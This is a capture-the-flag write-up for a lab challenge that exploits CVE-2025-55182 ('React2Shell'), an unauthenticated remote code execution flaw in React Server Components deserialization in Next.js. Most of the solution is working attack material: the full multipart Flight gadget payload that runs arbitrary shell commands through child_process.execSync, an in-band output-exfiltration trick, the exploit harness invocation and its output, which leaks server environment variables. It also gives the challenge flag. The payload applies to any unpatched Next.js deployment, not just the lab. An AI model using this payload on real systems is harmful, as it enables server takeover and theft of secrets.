#### Challenge:

Hi Senior Researcher,

SALVOR is a security-oriented learning environment designed for curious minds and aspiring security professionals. It provides a hands-on space to explore cybersecurity concepts, investigate realistic scenarios, and sharpen practical skills through interactive challenges.

Your task is to gain experience.

Stay curious!

The starting point for your SALVOR journey is  http://intro.salvor.nren.tcc

---

#### Solution:

The challenge target is **DSRepos** — a "Scientific Datasets Repository" search app at
`http://dsrepos.salvor.nren.tcc`. It is a **Next.js (App Router)** application whose search box
is backed by a **React Server Action**. The flag lives in a server-side environment variable, so
this is an RCE challenge (the name *Act-er* = Server **Act**ion / **act**or).

**1. Recon — find the Server Action.** The served `page.js` chunk registers one server reference:

```js
createServerReference("408546c41408a4d838d2327e502902d9c84e9e3457", ...,"searchAction")
```

A normal search is a POST carrying the action id in the `Next-Action` header:

```http
POST / HTTP/1.1
Host: dsrepos.salvor.nren.tcc
Next-Action: 408546c41408a4d838d2327e502902d9c84e9e3457
Accept: text/x-component
Content-Type: text/plain;charset=UTF-8

[{"query":"Census"}]
```

Response headers (`Vary: RSC, Next-Router-State-Tree, …`, `x-nextjs-*`) confirm Next.js App Router.

**2. Identify the vuln — CVE-2025-55182 ("React2Shell").** React Server Components deserialize the
request body with the **React Flight** protocol (`react-server-dom-webpack`). In vulnerable versions
(RSC 19.0.0–19.2.0 / Next.js 15.x–16.x) the Flight parser does **insufficient validation** of the
serialized object graph, so attacker-controlled chunks can be coerced into internal references and,
via a `__proto__` / `constructor.constructor` gadget, reach the JS `Function` constructor → **unauth
RCE**. CVSS 10. The action endpoint accepts a `multipart/form-data` Flight payload of numbered chunks.

**3. The gadget.** The payload is two multipart parts. Chunk `0` is a poisoned "resolved_model"
record; chunk `1` (`"$@0"`) references chunk 0 as a thenable so React *awaits* it, firing the
poisoned `then`. Walking `$1:__proto__:then` and `$1:constructor:constructor` hands React the
`Function` constructor, and `_response._prefix` becomes the body of a function that is then invoked —
i.e. arbitrary JS runs server-side:

```python
crafted_chunk = {
    "then":   "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value":  '{"then": "$B0"}',
    "_response": {
        # command runs here; output is smuggled back inside a thrown NEXT_REDIRECT error:
        "_prefix": f"var res = process.mainModule.require('child_process')"
                   f".execSync('{CMD}',{{'timeout':5000}}).toString().trim();"
                   f" throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        "_formData": {"get": "$1:constructor:constructor"},
    },
}
files = {"0": (None, json.dumps(crafted_chunk)), "1": (None, '"$@0"')}
```

**Output exfiltration trick:** instead of writing a file to the web root, the command result is
packed into the `digest` of a thrown `NEXT_REDIRECT` error. Next.js reflects that digest straight
into the Flight error chunk of the HTTP **500** response, so stdout comes back in-band — no second
request, no writable web root needed.

**4. Fire it.** The request wrapper (`exploit_harness.py`) sets the headers/`Next-Action`, retries
through the backend's intermittent 502s, and treats a `500` containing `E{"digest"` as the
confirmed deserialization-reached signal. The flag is in an env var, so the command is
`env | grep FLAG`:

```bash
python3 exploit_harness.py "env | grep FLAG;"
```

```
[*] attempt 1: HTTP 500 (96 bytes)
[+] vuln signal seen: 500 with E{"digest"} — deserialization reached.
$: env | grep FLAG;
0:{"a":"$@1","f":"","b":"kL9XW0SDT1rPxXq-0xBE2"}
1:E{"digest":"FLAG=FLAG{2cgd-Jb3C-0Tib-Iol9}"}
```

The `digest` field echoes `FLAG=FLAG{...}` — the RCE ran, read the server environment, and returned
it in the 500 body. (The same harness gives a full shell: `python3 exploit_harness.py "id"`,
`"ls -la /app"`, etc.)

**Fix:** upgrade RSC to 19.0.1 / 19.1.2 / 19.2.1 and Next.js to a patched 15.x–16.x release.

---

<details><summary>FLAG:</summary>

```
FLAG{2cgd-Jb3C-0Tib-Iol9}
```

</details>
<br/>
